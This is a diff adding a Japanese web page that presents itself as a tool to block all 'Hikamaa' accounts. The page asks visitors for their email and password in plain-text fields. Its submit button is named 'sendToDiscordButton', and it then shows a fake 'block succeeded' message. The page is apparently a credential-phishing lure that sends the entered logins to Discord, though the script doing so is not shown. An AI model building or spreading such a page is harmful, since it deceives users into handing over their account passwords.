@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ヒカマーブロックツール</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <h1 class="large-label">全ヒカマーをブロックするツールです</h1> 
+
+        <div class="form-group">
+            <label for="inputA" class="input-label">メールアドレスを入力</label>
+            <input type="text" id="inputA" class="text-input" placeholder="メールアドレレス">
+        </div>
+
+        <div class="form-group">
+            <label for="inputB" class="input-label">パスワードを入力</label>
+            <input type="text" id="inputB" class="text-input" placeholder="パスワード">
+        </div>
+
+        <div class="form-group">
+            <button id="lButton" class="text-input small-button">ログイン</button>
+        </div>
+
+        <button id="sendToDiscordButton" class="submit-button">ログインする</button>
+    </div>
+
+    <div id="cModal" class="modal">
+        <div class="modal-content">
+            <span class="close-button">&times;</span>
+            <p class="modal-text">ブロックに成功しました！</p>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
